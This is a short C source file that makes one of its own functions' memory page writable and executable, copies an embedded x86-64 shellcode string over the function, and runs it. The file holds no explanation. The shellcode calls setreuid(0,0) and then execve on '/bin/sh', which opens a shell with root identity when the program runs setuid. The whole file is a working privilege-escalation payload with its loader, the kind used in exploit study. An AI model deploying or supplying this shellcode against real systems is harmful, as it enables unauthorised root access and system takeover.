#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>

void foo(void) {}
int change_page_permissions_of_address(void *addr);

int main(void) {
    void *foo_addr = (void*)foo;

    // Change the permissions of the page that contains foo() to read, write, and execute
    // This assumes that foo() is fully contained by a single page
    if(change_page_permissions_of_address(foo_addr) == -1) {
        fprintf(stderr, "Error, changing page permissions of foo(): %s\n", strerror(errno));
        return 1;
    }

    char shellcode[] = "\x90\x90\x90\x90\x90"
                       "\x48\x31\xc0"
                       "\x48\x83\xc0\x71"
                       "\x48\x31\xff"
                       "\x48\x31\xf6"
                       "\x0f\x05"
                       "\xeb\x13"
                       "\x48\x31\xc0"
                       "\x48\x83\xc0\x3b"
                       "\x5f"
                       "\x88\x67\x07"
                       "\x48\x31\xf6"
                       "\x48\x31\xd2"
                       "\x0f\x05"
                       "\xe8\xe8\xff\xff\xff"
                       "\x2f"
                       "\x62"
                       "\x69"
                       "\x6e"
                       "\x2f"
                       "\x73\x68"
                       "\x4e";

    // Careful with the length of the shellcode here depending on what is after foo
    memcpy(foo_addr, shellcode, sizeof(shellcode)-1);

    foo();

    return 0;
}

int change_page_permissions_of_address(void *addr) {
    // Move the pointer to the page boundary
    int page_size = getpagesize();
    addr -= (unsigned long)addr % page_size;

    if(mprotect(addr, page_size, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
        return -1;
    }

    return 0;
}
